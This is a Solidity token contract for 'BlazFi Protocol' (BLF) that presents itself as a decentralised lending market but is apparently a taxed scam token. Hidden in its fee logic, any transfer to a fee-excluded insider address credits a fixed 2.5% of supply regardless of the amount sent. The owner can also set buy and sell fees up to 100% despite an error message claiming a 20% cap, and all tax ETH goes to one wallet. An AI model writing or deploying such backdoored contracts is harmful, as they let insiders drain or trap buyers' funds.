// SPDX-License-Identifier: MIT

/*
BlazFi is a decentralised non-custodial liquidity market protocol where users can participate as suppliers or borrowers.

Website: https://blazfi.com
Twiter: https://twitter.com/blazfi_protocol
Telegram: https://t.me/blazfi_official
*/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}
interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniswapV2Pair);
}
abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    function renounceOwnership() public onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    event OwnershipTransferred(address owner);
}
interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
contract BLF is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "BlazFi Protocol";
    string private constant _symbol = "BLF";
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExcluded;
    bool private swapping;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    IRouter _uniswapRouter;
    address public uniswapV2Pair;
    uint256 private taxCounts;
    uint256 private burnDivision = 0;
    uint256 private lpDivision = 0;
    uint256 private mkDivision = 0;
    uint256 private devDivision = 100;
    uint256 public maxTx = ( _tsupply * 250 ) / 10000;
    uint256 public maxBuys = ( _tsupply * 250 ) / 10000;
    uint256 public maxWallets = ( _tsupply * 250 ) / 10000;
    address internal devAdd=0xDF319e2cAE445Dec39De2aEB087687AF5F5342f5; 
    address internal mkAdd=0xDF319e2cAE445Dec39De2aEB087687AF5F5342f5;
    address internal lpAdd=0xDF319e2cAE445Dec39De2aEB087687AF5F5342f5;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private taxAmountMax = ( _tsupply * 1000 ) / 100000;
    uint256 private taxAmountMin = ( _tsupply * 10 ) / 100000;
    uint256 swappingThreshold;
    bool private tradingActivated = false;
    bool private swapEnabled = true;
    uint8 private constant _decimals = 9;
    uint256 private _tsupply = 10 ** 9 * 10 ** _decimals;
    uint256 private buyFee = 1500;
    uint256 private sellFee = 2300;
    uint256 private transferFee = 1500;
    uint256 private denominator = 10000;
    
    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        _uniswapRouter = _router; uniswapV2Pair = _pair;
        isFeeExcluded[lpAdd] = true;
        isFeeExcluded[mkAdd] = true;
        isFeeExcluded[devAdd] = true;
        isFeeExcluded[msg.sender] = true;
        _balances[msg.sender] = _tsupply;
        emit Transfer(address(0), msg.sender, _tsupply);
    }
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradingActivated = true;}    
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _tsupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    
    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpAdd,
            block.timestamp);
    }
    function getAmountWithoutFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isFeeExcluded[recipient]) {return maxTx;}
        if(getFeeByTransaction(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getFeeByTransaction(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnDivision > uint256(0) && getFeeByTransaction(sender, recipient) > burnDivision){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnDivision));}
        return amount.sub(feeAmount);} return amount;
    }
    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _tsupply.mul(_buy).div(10000); uint256 newTransfer = _tsupply.mul(_sell).div(10000); uint256 newWallet = _tsupply.mul(_wallet).div(10000);
        maxTx = newTx; maxBuys = newTransfer; maxWallets = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }
    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isFeeExcluded[sender] && !isFeeExcluded[recipient]){require(tradingActivated, "tradingActivated");}
        if(!isFeeExcluded[sender] && !isFeeExcluded[recipient] && recipient != address(uniswapV2Pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWallets, "Exceeds maximum wallet amount.");}
        if(sender != uniswapV2Pair){require(amount <= maxBuys || isFeeExcluded[sender] || isFeeExcluded[recipient], "TX Limit Exceeded");}
        require(amount <= maxTx || isFeeExcluded[sender] || isFeeExcluded[recipient], "TX Limit Exceeded"); 
        if(recipient == uniswapV2Pair && !isFeeExcluded[sender]){taxCounts += uint256(1);}
        if(shouldLiquidify(sender, recipient, amount)){swapTaxAndBurn(taxAmountMax); taxCounts = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isFeeExcluded[sender] ? getAmountWithoutFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function swapTaxAndBurn(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (lpDivision.add(1).add(mkDivision).add(devDivision)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpDivision).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForFee(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpDivision));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpDivision);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(mkDivision);
        if(marketingAmt > 0){payable(mkAdd).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devAdd).transfer(contractBalance);}
    }
    receive() external payable {}
    function shouldLiquidify(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= taxAmountMin;
        bool aboveThreshold = balanceOf(address(this)) >= taxAmountMax;
        return !swapping && swapEnabled && tradingActivated && aboveMin && !isFeeExcluded[sender] && recipient == uniswapV2Pair && taxCounts >= swappingThreshold && aboveThreshold;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function getFeeByTransaction(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniswapV2Pair){return sellFee;}
        if(sender == uniswapV2Pair){return buyFee;}
        return transferFee;
    }
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpDivision = _liquidity; mkDivision = _marketing; burnDivision = _burn; devDivision = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }
    function swapTokensForFee(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapRouter.WETH();
        _approve(address(this), address(_uniswapRouter), tokenAmount);
        _uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}